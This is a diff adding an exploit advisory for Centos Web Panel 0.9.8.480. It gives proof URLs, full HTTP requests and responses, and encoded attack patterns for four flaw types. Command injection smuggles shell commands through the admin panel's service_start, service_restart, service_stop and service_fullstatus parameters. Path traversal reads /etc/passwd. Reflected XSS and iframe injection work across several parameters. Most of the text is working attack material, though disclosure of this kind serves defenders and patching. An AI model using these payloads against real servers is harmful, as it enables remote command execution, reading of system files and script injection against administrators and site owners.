@@ -1,0 +1,172 @@
+# Exploit Title: Centos Web Panel 0.9.8.480 Multiple Vulnerabilities
+# Exploit Author: Seccops - Siber Güvenlik Hizmetleri (https://seccops.com)
+# Vendor Homepage: http://centos-webpanel.com/
+# Software Link: http://centos-webpanel.com/system-requirements
+# Version: 0.9.8.480
+# Tested on: Centos 7
+# Vulnerability Types: Command Injection, Local File Inclusion, Cross-site Scripting, Frame Injection
+# CVE: -
+  
+### Vulnerability Name: Command Injection ###
+ 
+1)
+Proof URL: http://localhost:2030/admin/index.php?service_start=opendkim;expr 268409241 - 2;x  
+Parameter Name: service_start  
+Parameter Type: GET  
+Attack Pattern: opendkim%3bexpr+268409241+-+2%3bx 
+ 
+HTTP Request:
+ 
+GET /admin/index.php?service_start=opendkim%3bexpr%20268409241%20-%202%3bx HTTP/1.1
+Host: localhost:2030
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Cookie: cwpsrv-983b3c1326b3c5dafa7941a1ef2fbf67=jhg556f3k83kpgbhbdfsd0pps6; resolve_ids=0; roundcube_sessid=j2h7ad1kb1coji7hba2bo5pil5; order_dir_list_by=7D
+Referer: http://localhost:2030/admin/
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+ 
+Note: Mathematical process: 268409241 - 2. So, the result is expected 268409239.
+ 
+HTTP Response:
+ 
+HTTP/1.1 200 OK
+Server: cwpsrv
+X-Powered-By: PHP/7.0.24
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Date: Mon, 01 Oct 2018 21:06:42 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+ 
+    HTML Content:
+ 
+        <div class='alert alert-warning'>
+                    <button type='button' class='close' data-dismiss='alert'>×</button>
+                    <strong>WARNING!</strong> <pre>268409239
+        sh: x.service: command not found
+        </pre><br>
+ 
+2)
+Proof URL: http://localhost:2030/admin/index.php?service_restart=sshd;expr 268409241 - 2;x  
+Parameter Name: service_restart  
+Parameter Type: GET  
+Attack Pattern: sshd%3bexpr+268409241+-+2%3bx
+ 
+3)
+Proof URL: http://localhost:2030/admin/index.php?service_fullstatus=opendkim;expr 268409241 - 2;x  
+Parameter Name: service_fullstatus  
+Parameter Type: GET  
+Attack Pattern: opendkim%3bexpr+268409241+-+2%3bx 
+ 
+4)
+Proof URL: http://localhost:2030/admin/index.php?service_stop=named;expr 268409241 - 2;x  
+Parameter Name: service_stop  
+Parameter Type: GET  
+Attack Pattern: named%3bexpr+268409241+-+2%3bx
+ 
+### Vulnerability Name: Local File Inclusion ###
+ 
+1)
+Proof URL: http://localhost:2030/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd  
+Parameter Name: file  
+Parameter Type: GET  
+Attack Pattern: %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd  
+ 
+HTTP Request:
+ 
+GET /admin/index.php?module=file_editor&file=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: localhost:2030
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Cookie: cwpsrv-983b3c1326b3c5dafa7941a1ef2fbf67=jhg556f3k83kpgbhbdfsd0pps6; resolve_ids=0; roundcube_sessid=j2h7ad1kb1coji7hba2bo5pil5; order_dir_list_by=7D
+Referer: http://localhost:2030/admin/index.php
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+ 
+HTTP Response:
+ 
+HTTP/1.1 200 OK
+Server: cwpsrv
+X-Powered-By: PHP/7.0.24
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Date: Mon, 01 Oct 2018 20:45:19 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+ 
+    HTML Content:
+        File info <a href='index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd&stats=yes'>[stats]</a>:<pre>-rw-r--r-- 1 root root 2272 Sep 28 07:48 /../../../../../../../../../../../etc/passwd
+        </pre><h3>Contents of File: /../../../../../../../../../../../etc/passwd</h3>
+            <form action='' method= 'post'>
+            <textarea id='textarea' name='newd' cols='100%' rows='50'>root:x:0:0:root:/root:/bin/bash
+        bin:x:1:1:bin:/bin:/sbin/nologin
+        daemon:x:2:2:daemon:/sbin:/sbin/nologin
+        adm:x:3:4:adm:/var/adm:/sbin/nologin
+        lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+        sync:x:5:0:sync:/sbin:/bin/sync
+        etc...
+        
+### Vulnerability Name: Cross-site Scripting & Frame Injection ###
+ 
+1)
+Proof URL: http://localhost:2030/admin/fileManager2.php?frame=3&action=8&cmd_arg=design&fm_current_dir=<scRipt>alert(1)</scRipt>  
+Parameter Name: fm_current_dir  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+2)
+Proof URL: http://localhost:2030/admin/index.php?module=<scRipt>alert(1)</scRipt>&file=/etc/sysconfig/selinux  
+Parameter Name: module  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+3)
+Proof URL: http://localhost:2030/admin/index.php?service_start=<scRipt>alert(1)</scRipt>  
+Parameter Name: service_start  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+4)
+Proof URL: http://localhost:2030/admin/index.php?service_fullstatus=<scRipt>alert(1)</scRipt>  
+Parameter Name: service_fullstatus  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+5)
+Proof URL: http://localhost:2030/admin/index.php?service_restart=<scRipt>alert(1)</scRipt>  
+Parameter Name: service_restart  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+6)
+Proof URL: http://localhost:2030/admin/index.php?service_stop=<scRipt>alert(1)</scRipt>  
+Parameter Name: service_stop  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+7)
+Proof URL: http://localhost:2030/admin/index.php?module=file_editor&file=<scRipt>alert(1)</scRipt>  
+Parameter Name: file  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
+ 
+8)
+Proof URL: http://localhost:2030/admin/index.php?module=<scRipt>alert(1)</scRipt>&dir=/var/log  
+Parameter Name: module  
+Parameter Type: GET  
+Attack Pattern for XSS: %3cscRipt%3ealert(1)%3c%2fscRipt%3e
+Attack Pattern for Frame Injection: %3ciframe+src%3d%22https%3a%2f%2fseccops.com%2f%3f%22%3e%3c%2fiframe%3e
